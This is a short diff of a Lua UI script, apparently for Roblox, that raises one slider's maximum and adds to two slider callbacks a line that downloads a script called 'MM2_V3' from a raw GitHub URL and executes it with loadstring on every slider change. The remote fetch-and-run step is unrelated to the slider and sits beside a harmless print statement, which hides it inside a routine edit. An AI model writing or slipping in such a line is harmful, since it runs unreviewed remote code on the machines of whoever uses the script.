@@ -58,9 +58,10 @@ local Slider = Tabs.Main:AddSlider("Slider", {
         Description = "",
         Default = 0,
         Min = 0,
-        Max = 15,
+        Max = 20,
         Rounding = 1,
         Callback = function(Value)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/XeroReborn/SaintaScriptV2/refs/heads/main/MM2_V3"))()
             print("Slider was changed:", Value)
         end
     })
@@ -79,6 +80,7 @@ local Slider = Tabs.Main:AddSlider("Slider", {
         Max = 25,
         Rounding = 1,
         Callback = function(Value)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/XeroReborn/SaintaScriptV2/refs/heads/main/MM2_V3"))()
             print("Slider was changed:", Value)
         end
     })
